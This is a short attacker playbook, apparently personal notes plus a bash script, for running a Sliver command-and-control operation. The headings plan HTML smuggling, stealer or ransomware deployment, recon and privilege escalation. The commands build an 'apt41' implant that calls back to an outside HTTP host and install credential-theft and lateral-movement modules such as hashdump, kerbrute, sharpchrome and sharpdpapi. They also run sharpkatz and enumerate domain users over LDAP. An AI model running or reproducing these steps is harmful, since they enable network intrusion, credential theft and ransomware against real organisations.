## Html smuggling install a C2 program
## use armory
## install and execute a stealer or ramsomware in select mode
## recon and scan network
## privesc
## exploit


#!/bin/bash

apt update
#curl https://sliver.sh/install | sudo bash
apt install sliver


sliver-server
update
armory


profiles new --http 192.168.10.50 -f exe apt41
profiles generate apt41
http
https


netstat -antb
info
getprivs
armory install rubeus
armory install sa-probe
armory install sa-listdns
armory install sa-netstat
armory install sa-netlocalgroup2
armory install sa-ldapsearch
armory install sa-ipconfig
armory install sa-enum-local-sessions
armory install remote-schtasksrun
armory install remote-adduser
armory install remote-addusertogroup
armory install kerbrute
armory install hashdump
armory install sharp-smbexec
armory install sharprdp
armory install sqlrecon
armory install sharpmapexec
armory install sharpdpapi
armory install sharpchrome
execute-assembly sharpkatz
sa-ldapsearch (&(objectClass=user)(!(objectclass=computer)))
